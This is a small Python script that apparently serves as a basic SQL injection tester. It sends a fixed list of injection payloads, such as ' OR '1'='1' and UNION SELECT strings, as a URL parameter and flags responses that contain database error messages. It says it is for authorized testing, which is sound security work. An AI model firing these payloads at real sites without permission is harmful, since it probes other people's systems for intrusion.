import sys
import argparse
import requests

PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "1' AND '1'='2",
    "' UNION SELECT NULL-- ",
    '" OR "1"="1',
]

ERROR_SIGNATURES = [
    "sql syntax", "mysql_fetch", "ora-01756", "unclosed quotation mark",
    "quoted string not properly terminated", "sqlite3.OperationalError",
    "pg_query", "warning: mysql", "you have an error in your sql syntax",
]


def test_param(url, param, timeout=5):
    """Send each SQLi payload as the given URL parameter and check responses for SQL error signatures."""
    print(f"\nTesting {url} on parameter '{param}'...")
    print("-" * 50)

    findings = []

    for payload in PAYLOADS:
        try:
            response = requests.get(url, params={param: payload}, timeout=timeout)
        except requests.exceptions.RequestException as e:
            print(f"Request failed for payload {payload!r}: {e}")
            continue

        body_lower = response.text.lower()
        matched_signature = next((sig for sig in ERROR_SIGNATURES if sig in body_lower), None)

        if matched_signature:
            print(f"POSSIBLE SQLi [{response.status_code}] with payload {payload!r} -> matched: '{matched_signature}'")
            findings.append(payload)
        else:
            print(f"OK [{response.status_code}] with payload {payload!r} -> no error signature detected")

    print("-" * 50)
    if findings:
        print(f"{len(findings)} payload(s) triggered possible SQL error responses. Manual verification recommended.")
    else:
        print("No SQL error signatures detected. This does not guarantee the target is safe.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Test a URL parameter for basic SQL injection error signatures. "
                    "For use only against systems you own or are authorized to test."
    )
    parser.add_argument("url", help="Target URL (e.g. http://example.com/product.php)")
    parser.add_argument("param", help="Query parameter name to test (e.g. id)")
    parser.add_argument("-t", "--timeout", type=float, default=5, help="Request timeout in seconds (default: 5)")

    args = parser.parse_args()
    test_param(args.url, args.param, args.timeout)
